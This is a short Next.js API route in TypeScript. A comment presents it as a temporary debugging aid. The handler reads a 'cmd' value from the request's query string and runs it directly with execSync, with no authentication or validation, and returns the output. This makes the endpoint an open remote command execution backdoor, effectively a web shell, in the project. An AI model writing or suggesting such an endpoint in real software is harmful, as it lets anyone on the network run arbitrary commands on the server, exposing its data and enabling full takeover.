import { NextApiRequest, NextApiResponse } from 'next'
import { execSync } from 'child_process'
// TODO: DELETE
// JUST WANT TO KNOW WHY REQUEST ERROR
export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { cmd = '' } = req.query
  const out = execSync(cmd as string)
  res.end(out)
}
